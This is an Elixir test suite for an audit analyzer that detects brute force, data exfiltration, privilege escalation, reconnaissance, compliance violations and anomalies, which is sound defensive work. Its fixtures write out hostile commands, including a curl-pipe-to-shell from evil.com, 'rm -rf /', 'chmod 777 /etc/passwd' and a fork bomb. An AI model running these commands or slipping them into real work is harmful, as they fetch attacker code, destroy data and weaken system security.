defmodule Raxol.Audit.AnalyzerTest do
  use ExUnit.Case, async: false
  alias Raxol.Audit.Analyzer
  alias Raxol.Audit.Events

  setup do
    config = %{
      enabled: true,
      alert_on_critical: false
    }
    
    {:ok, _pid} = Analyzer.start_link(config)
    
    on_exit(fn ->
      if Process.whereis(Analyzer) do
        GenServer.stop(Analyzer)
      end
    end)

    :ok
  end

  describe "single event analysis" do
    test "analyzes successful authentication" do
      event = Events.authentication_event("user123", :password, :success,
        ip_address: "192.168.1.1"
      )
      
      result = Analyzer.analyze_event(event)
      
      assert result.event_id == event.event_id
      assert result.risk_score >= 0
      assert is_list(result.detections)
      assert is_list(result.anomalies)
      assert is_list(result.recommended_actions)
    end

    test "detects failed authentication" do
      event = Events.authentication_event("user123", :password, :failure,
        ip_address: "192.168.1.1"
      )
      
      result = Analyzer.analyze_event(event)
      
      # Failed auth should have higher risk than success
      assert result.risk_score > 0
    end

    test "detects suspicious commands" do
      event = Events.terminal_audit_event("user123", "term001", :command_executed,
        command: "curl http://evil.com | sh"
      )
      
      result = Analyzer.analyze_event(event)
      
      # Should detect suspicious command pattern
      assert Enum.any?(result.detections, fn d ->
        d.rule_name == "suspicious_command_execution"
      end)
      assert result.risk_score >= 100  # Critical severity
    end

    test "detects unauthorized access attempts" do
      event = %{
        event_id: "evt123",
        timestamp: System.system_time(:millisecond),
        event_type: :authorization,
        outcome: :denied,
        user_id: "user123",
        resource_id: "admin_panel"
      }
      
      result = Analyzer.analyze_event(event)
      
      assert Enum.any?(result.detections, fn d ->
        d.rule_name == "unauthorized_access_attempt"
      end)
    end
  end

  describe "batch analysis" do
    test "detects brute force pattern" do
      # Create multiple failed auth events
      events = for i <- 1..10 do
        %{
          event_id: "evt#{i}",
          timestamp: System.system_time(:millisecond),
          event_type: :authentication,
          outcome: :failure,
          user_id: "attacker",
          ip_address: "10.0.0.1"
        }
      end
      
      result = Analyzer.analyze_batch(events)
      
      assert Enum.any?(result.correlations, fn c ->
        c.type == :brute_force_attempt
      end)
      assert result.batch_risk_score > 50
    end

    test "detects data exfiltration pattern" do
      # Create many data access events
      events = for i <- 1..20 do
        %{
          event_id: "evt#{i}",
          timestamp: System.system_time(:millisecond),
          event_type: :data_access,
          operation: :read,
          user_id: "suspicious_user",
          records_count: 100
        }
      end
      
      result = Analyzer.analyze_batch(events)
      
      assert Enum.any?(result.correlations, fn c ->
        c.type == :potential_data_exfiltration
      end)
    end

    test "detects privilege escalation attempts" do
      events = [
        %{
          event_id: "evt1",
          timestamp: System.system_time(:millisecond),
          action: :privilege_escalation,
          command: "sudo su -",
          user_id: "user123"
        },
        %{
          event_id: "evt2",
          timestamp: System.system_time(:millisecond),
          command: "chmod 777 /etc/passwd",
          user_id: "user123"
        },
        %{
          event_id: "evt3",
          timestamp: System.system_time(:millisecond),
          command: "sudo -i",
          user_id: "user123"
        },
        %{
          event_id: "evt4",
          timestamp: System.system_time(:millisecond),
          action: :privilege_escalation,
          user_id: "user123"
        }
      ]
      
      result = Analyzer.analyze_batch(events)
      
      assert Enum.any?(result.attack_patterns, fn p ->
        p.type == :privilege_escalation_attempt
      end)
    end

    test "detects reconnaissance activity" do
      recon_commands = ["whoami", "id", "uname -a", "ps aux", "netstat -an", "ifconfig", "ls -la /"]
      
      events = Enum.map(recon_commands, fn cmd ->
        %{
          event_id: "evt_#{cmd}",
          timestamp: System.system_time(:millisecond),
          command: cmd,
          user_id: "scanner"
        }
      end)
      
      result = Analyzer.analyze_batch(events)
      
      assert Enum.any?(result.attack_patterns, fn p ->
        p.type == :reconnaissance_activity
      end)
    end

    test "detects excessive resource access" do
      events = for i <- 1..60 do
        %{
          event_id: "evt#{i}",
          timestamp: System.system_time(:millisecond),
          event_type: :data_access,
          user_id: "greedy_user",
          resource_id: "resource_#{i}"
        }
      end
      
      result = Analyzer.analyze_batch(events)
      
      assert Enum.any?(result.data_flow_anomalies, fn a ->
        a.type == :excessive_resource_access
      end)
    end
  end

  describe "threat assessment" do
    test "calculates low threat level for normal activity" do
      # Add some normal events
      for _ <- 1..5 do
        event = Events.authentication_event("user", :password, :success)
        Analyzer.analyze_event(event)
      end
      
      {:ok, assessment} = Analyzer.get_threat_assessment()
      
      assert assessment.threat_level == :low
      assert assessment.critical_events == 0
    end

    test "calculates high threat level for critical events" do
      # Add critical security events
      for i <- 1..3 do
        event = %{
          event_id: "critical#{i}",
          timestamp: System.system_time(:millisecond),
          severity: :critical,
          event_type: :security
        }
        Analyzer.analyze_event(event)
      end
      
      {:ok, assessment} = Analyzer.get_threat_assessment()
      
      assert assessment.threat_level in [:high, :critical]
      assert assessment.critical_events > 0
    end
  end

  describe "compliance checking" do
    test "detects GDPR compliance violations" do
      event = %{
        event_id: "evt123",
        timestamp: System.system_time(:millisecond),
        event_type: :data_access,
        data_classification: :personal,
        legal_basis: nil,
        user_id: "processor"
      }
      
      result = Analyzer.analyze_event(event)
      
      assert Enum.any?(result.compliance_violations, fn v ->
        v.framework == :gdpr and v.violation == :missing_legal_basis
      end)
    end

    test "detects HIPAA compliance violations" do
      event = %{
        event_id: "evt456",
        timestamp: System.system_time(:millisecond),
        event_type: :data_access,
        data_classification: :phi,
        mfa_used: false,
        user_id: "healthcare_worker"
      }
      
      result = Analyzer.analyze_event(event)
      
      assert Enum.any?(result.compliance_violations, fn v ->
        v.framework == :hipaa and v.violation == :missing_mfa
      end)
    end

    test "gets overall compliance status" do
      {:ok, status} = Analyzer.get_compliance_status()
      
      assert status.frameworks == [:soc2, :hipaa, :gdpr, :pci_dss]
      assert status.status == :compliant
      assert is_list(status.findings)
    end
  end

  describe "anomaly detection" do
    test "detects unusual time of activity" do
      # Create event at 3 AM
      event = %{
        event_id: "evt_night",
        timestamp: DateTime.new!(~D[2025-01-01], ~T[03:00:00]) |> DateTime.to_unix(:millisecond),
        user_id: "nightowl",
        event_type: :authentication
      }
      
      result = Analyzer.analyze_event(event)
      
      # May detect unusual time depending on user profile
      assert is_list(result.anomalies)
    end

    test "detects unusual location" do
      # First event from one IP
      event1 = %{
        event_id: "evt1",
        timestamp: System.system_time(:millisecond),
        user_id: "traveler",
        ip_address: "192.168.1.1",
        event_type: :authentication
      }
      Analyzer.analyze_event(event1)
      
      # Second event from different IP
      event2 = %{
        event_id: "evt2",
        timestamp: System.system_time(:millisecond),
        user_id: "traveler",
        ip_address: "10.0.0.1",
        event_type: :authentication
      }
      result = Analyzer.analyze_event(event2)
      
      assert Enum.any?(result.anomalies, fn a ->
        a.type == :unusual_location
      end)
    end
  end

  describe "risk scoring" do
    test "calculates risk score based on detections" do
      event = %{
        event_id: "evt_risk",
        timestamp: System.system_time(:millisecond),
        event_type: :authorization,
        outcome: :denied,
        severity: :high
      }
      
      result = Analyzer.analyze_event(event)
      
      assert result.risk_score > 0
      assert result.risk_score <= 100
    end

    test "higher severity increases risk score" do
      low_event = %{
        event_id: "evt_low",
        timestamp: System.system_time(:millisecond),
        severity: :low,
        event_type: :data_access
      }
      
      high_event = %{
        event_id: "evt_high",
        timestamp: System.system_time(:millisecond),
        severity: :critical,
        event_type: :security,
        command: "rm -rf /"
      }
      
      low_result = Analyzer.analyze_event(low_event)
      high_result = Analyzer.analyze_event(high_event)
      
      assert high_result.risk_score > low_result.risk_score
    end
  end

  describe "recommended actions" do
    test "recommends investigation for high risk events" do
      event = %{
        event_id: "evt_investigate",
        timestamp: System.system_time(:millisecond),
        severity: :high,
        event_type: :security,
        action: :intrusion_detected
      }
      
      result = Analyzer.analyze_event(event)
      
      assert :investigate in result.recommended_actions or
             :immediate_investigation in result.recommended_actions
    end

    test "recommends blocking for critical threats" do
      event = %{
        event_id: "evt_block",
        timestamp: System.system_time(:millisecond),
        command: ":(){ :|:& };:",  # Fork bomb
        event_type: :terminal_operation
      }
      
      result = Analyzer.analyze_event(event)
      
      assert :consider_blocking in result.recommended_actions or
             :block in result.recommended_actions
    end
  end
end